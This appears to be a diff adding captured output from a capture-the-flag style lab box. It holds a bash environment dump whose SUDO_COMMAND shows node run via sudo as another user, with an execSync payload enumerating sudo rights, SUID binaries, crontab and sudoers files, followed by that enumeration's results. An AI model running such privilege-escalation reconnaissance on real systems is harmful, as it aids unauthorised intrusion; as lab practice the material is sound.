@@ -1,0 +1,67 @@
+BASH=/usr/bin/bash
+BASHOPTS=checkwinsize:cmdhist:complete_fullquote:extquote:force_fignore:globasciiranges:globskipdots:hostcomplete:interactive_comments:patsub_replacement:progcomp:promptvars:sourcepath
+BASH_ALIASES=()
+BASH_ARGC=([0]="0")
+BASH_ARGV=()
+BASH_CMDS=()
+BASH_EXECUTION_STRING=set
+BASH_LINENO=()
+BASH_LOADABLES_PATH=/usr/local/lib/bash:/usr/lib/bash:/opt/local/lib/bash:/usr/pkg/lib/bash:/opt/pkg/lib/bash:.
+BASH_SOURCE=()
+BASH_VERSINFO=([0]="5" [1]="2" [2]="21" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
+BASH_VERSION='5.2.21(1)-release'
+DIRSTACK=()
+EUID=1003
+GROUPS=()
+HOME=/home/calamardo
+HOSTNAME=dockerlabs
+HOSTTYPE=x86_64
+IFS=$' \t\n'
+LANG=C.UTF-8
+LOGNAME=calamardo
+MACHTYPE=x86_64-pc-linux-gnu
+MAIL=/var/mail/calamardo
+OPTERR=1
+OPTIND=1
+OSTYPE=linux-gnu
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+PIPESTATUS=([0]="0")
+PPID=187
+PS4='+ '
+PWD=/home/bob
+SHELL=/bin/bash
+SHELLOPTS=braceexpand:hashall:interactive-comments
+SHLVL=1
+SUDO_COMMAND='/bin/node -e const cp=require("child_process");const o=cp.execSync("bash -c set +e; id; echo @@@ sudo -n -l @@@; sudo -n -l 2>&1; echo @@@ gating files @@@; ls -la /opt/ak.pk1 /bin/12bn 2>&1; echo @@@ SUID @@@; find / -perm -4000 -type f 2>/dev/null; echo @@@ crontab @@@; cat /etc/crontab 2>/dev/null; echo @@@ sudoers.d @@@; ls -la /etc/sudoers.d/ 2>/dev/null; cat /etc/sudoers.d/* 2>/dev/null; true").toString();console.log(o)'
+SUDO_GID=1002
+SUDO_UID=1002
+SUDO_USER=bob
+TERM=unknown
+UID=1003
+USER=calamardo
+_=']'
+uid=1003(calamardo) gid=1003(calamardo) groups=1003(calamardo),100(users)
+@@@ sudo -n -l @@@
+sudo: a password is required
+@@@ gating files @@@
+-rw-r--r--. 1 root root 2 Jan  5  2025 /bin/12bn
+-rw-r--r--. 1 root root 2 Jan  5  2025 /opt/ak.pk1
+@@@ SUID @@@
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+@@@ crontab @@@
+@@@ sudoers.d @@@
+total 4
+drwxr-xr-x. 1 root root   12 Jan  5  2025 .
+drwxr-xr-x. 1 root root   56 Aug 14 21:49 ..
+-r--r-----. 1 root root 1068 Jan 29  2024 README
+
